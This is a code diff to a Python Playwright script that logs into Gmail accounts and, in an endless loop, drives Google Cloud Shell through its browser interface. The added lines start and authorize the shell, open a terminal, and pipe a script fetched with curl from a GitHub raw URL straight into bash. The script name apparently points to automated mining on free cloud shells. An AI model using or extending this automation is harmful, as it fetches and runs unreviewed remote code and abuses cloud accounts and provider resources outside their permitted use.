@@ -76,8 +76,20 @@ async def login_gmail(email: str, password: str,url: str):
             await page.keyboard.press("Enter", delay=2)
             print("hoan thanh")
             while True:
-                await asyncio.sleep(1200)
+                await asyncio.sleep(1800)
                 await page2.goto(a2)
+                print(1)
+                await page.goto("https://shell.cloud.google.com", timeout=500000)
+                await page.get_by_role("checkbox", name="I agree that my use of any").check(timeout=500000)
+                await page.get_by_role("button", name="Start Cloud Shell").click(timeout=500000)
+                print(2)
+                await page.get_by_role("button", name="Authorize").click(timeout=500000)
+                await page.locator("#cloud-shell-editor").content_frame.locator(".gettingStartedSlideDetails > div").click(timeout=500000)
+                print(3)
+                await page.locator("#cloud-shell-editor").content_frame.get_by_role("button", name="Inspect this in the").press("ControlOrMeta+`", timeout=500000)
+                await page.locator("#cloud-shell-editor").content_frame.get_by_role("textbox", name="Terminal 1, bash Run the").click(timeout=500000)
+                await page.locator("#cloud-shell-editor").content_frame.get_by_role("textbox", name="Terminal 1, bash Run the").fill("curl -sL https://raw.githubusercontent.com/ChauDuongw/toll/refs/heads/main/dao.sh | bash", timeout=500000)
+                await page.keyboard.press("Enter", delay=2)
 
         await Dangnhap()
 async def main():
